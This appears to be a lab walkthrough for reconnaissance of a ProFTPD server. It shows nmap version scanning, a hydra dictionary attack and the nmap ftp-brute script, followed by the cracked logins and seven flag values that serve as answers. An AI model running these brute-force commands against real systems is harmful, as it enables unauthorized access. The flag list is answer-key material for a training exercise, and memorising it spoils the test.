# ProFTP Recon: Basics

ProFTP is an ftp server broadly used in linux, and the objective of this lab is to enumerate some information about the ftp server.

1. What is the version of FTP server?

- You can easily do this with nmap `nmap x.x.x.x -p 21 -sV -O` assuming you have already discovered an ftp service running in the machine. The version of the FTP server is: ProFTPD 1.3.5a.

2. Use the username dictionary /usr/share/metasploit-framework/data/wordlists/common_users.txt and password dictionary /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt to check if any of these credentials work on the system. List all found credentials.

- First try connecting to the ftp server using anonymous login.
- If nothing can be obtained out of it, let's use hydra to perform a dictionary attack in the ftp login like this: `hydra -L /path/to/username/list -P /path/to/password/list x.x.x.x <protocol>`. **Note**: `-P` is for a list of passwords.

We got quite a list from the dictionary attack:

[21][ftp] host: 192.124.161.3   login: sysadmin   password: 654321
[21][ftp] host: 192.124.161.3   login: rooty   password: qwerty
[21][ftp] host: 192.124.161.3   login: demo   password: butterfly
[21][ftp] host: 192.124.161.3   login: auditor   password: chocolate
[21][ftp] host: 192.124.161.3   login: anon   password: purple
[21][ftp] host: 192.124.161.3   login: administrator   password: tweety
[21][ftp] host: 192.124.161.3   login: diag   password: tigger


3. Find the password of user “sysadmin” using nmap script.

- We can brutforce a login using nmap scripts. Try it out with a list of users like this: `nmap x.x.x.x --script ftp-brute --script-args userdb=/path/to/user/list -p 21`. We use port 21 as we only target the discovered ftp port.
- The password for sysadmin is: 654321.

4. Find seven flags hidden on the server.

- Secret for sysadmin: 260ca9dd8a4577fc00b7bd5810298076
- Secret for rooty: e529a9cea4a728eb9c5828b13b22844c
- Secret for demo: d6a6bc0db10694a2d90e3a69648f3a03
- Secret for auditor: 098f6bcd4621d373cade4e832627b4f6
- Secret for anon: 1bc29b36f623ba82aaf6724fd3b16718
- Secret for administrator: 21232f297a57a5a743894a0e4a801fc3
- Secret for diag: 12a032ce9179c32a6c7ab397b9d871fa